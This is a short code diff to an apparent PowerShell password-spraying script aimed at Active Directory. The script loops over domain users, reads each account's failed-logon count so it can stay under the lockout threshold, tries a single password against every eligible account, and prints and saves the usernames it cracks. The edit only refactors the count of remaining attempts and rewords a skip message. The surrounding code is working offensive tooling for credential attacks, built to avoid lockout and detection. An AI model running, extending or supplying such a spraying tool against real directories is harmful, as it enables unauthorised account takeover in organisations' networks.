@@ -30,7 +30,8 @@ $users | ForEach-Object {
     $userProperties = $_.Properties
     $UserName = $userProperties["sAMAccountName"][0]
     $BadPwdCount = $userProperties["badPwdCount"][0]
-    if (($LockoutThreshold -eq 0) -or (($LockoutThreshold - $BadPwdCount) -gt 2)) {
+    $logonAttempts = ($LockoutThreshold - $BadPwdCount)
+    if (($LockoutThreshold -eq 0) -or ($logonAttempts -gt 2)) {
         $auth = Invoke-ADConnection -username $UserName -password $password
         if($auth -eq "True"){
             Write-Host -ForegroundColor Green ("[+] {0}:{1}" -f $UserName,$password)
@@ -39,10 +40,9 @@ $users | ForEach-Object {
         Write-Progress -Activity "In Progress:" -Status  "$Counter/$total Completed" -PercentComplete($Counter/$total*100)
         $Counter++
     } else {
-        Write-Host -ForegroundColor Red "[-] Skipped: $UserName have less than 2 loggon attempts!"
+        Write-Host -ForegroundColor Red "[-] Skipped: $UserName have $logonAttempts loggon attempts!"
     }
 }
 Write-Host "`n"
 Write-Host -ForegroundColor Yellow "[+] Users Found: $users_found_num"
 Write-Host -ForegroundColor Green "Saving Results To: 'UsersFound.txt'" 
-
